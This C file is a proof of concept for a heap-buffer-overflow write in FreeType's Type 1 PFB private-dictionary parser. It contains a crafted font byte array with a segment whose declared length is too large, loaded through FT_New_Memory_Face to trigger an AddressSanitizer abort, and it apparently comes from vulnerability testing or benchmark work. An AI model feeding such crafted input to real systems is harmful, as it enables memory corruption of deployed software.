/*
 * probe.c -- proof of concept for a heap-buffer-overflow (CWE-787) in
 *            FreeType's Type 1 PFB private-dictionary reader,
 *            T1_Get_Private_Dict() in src/type1/t1parse.c.
 *
 * The PFB private dictionary is read in two passes: a first pass sums the
 * length of every binary (0x8002) segment to size the destination buffer,
 * a second pass copies each segment into that buffer.  The first pass
 * skips a segment whose declared length runs past the end of the stream
 * (the "Check the size" guard), so such a segment is NOT counted; the
 * second pass has no matching guard and still copies the segment's bytes,
 * writing past the end of the under-sized allocation.
 *
 * Input is a well-formed in-memory PFB font supplied through the public
 * API FT_New_Memory_Face().  On the resulting tree AddressSanitizer
 * aborts with a heap-buffer-overflow WRITE inside the second-pass copy;
 * on the original batch the same input is rejected cleanly (no abort).
 *
 * Build (example):
 *   gcc -fsanitize=address -g -I<freetype>/include \
 *       probe.c libfreetype.a -lm -o probe
 *   ./probe
 */

#include <ft2build.h>
#include FT_FREETYPE_H

#include <stdio.h>

/*
 * A minimal PFB container:
 *   - one ASCII (0x8001) segment holding the top dictionary, and
 *   - two binary (0x8002) private-dictionary segments; the second one
 *     declares a length (1000) far larger than the handful of bytes that
 *     actually remain in the stream.
 */
static const unsigned char pfb_data[] = {
  0x80, 0x01, 0x33, 0x00, 0x00, 0x00, 0x25, 0x21, 0x50, 0x53, 0x2d, 0x41,
  0x64, 0x6f, 0x62, 0x65, 0x46, 0x6f, 0x6e, 0x74, 0x2d, 0x31, 0x2e, 0x30,
  0x3a, 0x20, 0x54, 0x65, 0x73, 0x74, 0x65, 0x72, 0x20, 0x30, 0x30, 0x31,
  0x2e, 0x30, 0x30, 0x31, 0x0a, 0x2f, 0x46, 0x6f, 0x6e, 0x74, 0x54, 0x79,
  0x70, 0x65, 0x20, 0x31, 0x20, 0x64, 0x65, 0x66, 0x0a, 0x80, 0x02, 0x20,
  0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x80,
  0x02, 0xe8, 0x03, 0x00, 0x00, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
  0x42,
};

int
main( void )
{
  FT_Library  library;
  FT_Face     face;
  FT_Error    error;

  if ( FT_Init_FreeType( &library ) )
    return 2;

  /* public API, in-contract input: open the font from memory */
  error = FT_New_Memory_Face( library,
                              pfb_data,
                              (FT_Long)sizeof ( pfb_data ),
                              0,
                              &face );

  printf( "FT_New_Memory_Face returned %d\n", error );

  if ( !error )
    FT_Done_Face( face );

  FT_Done_FreeType( library );
  return 0;
}
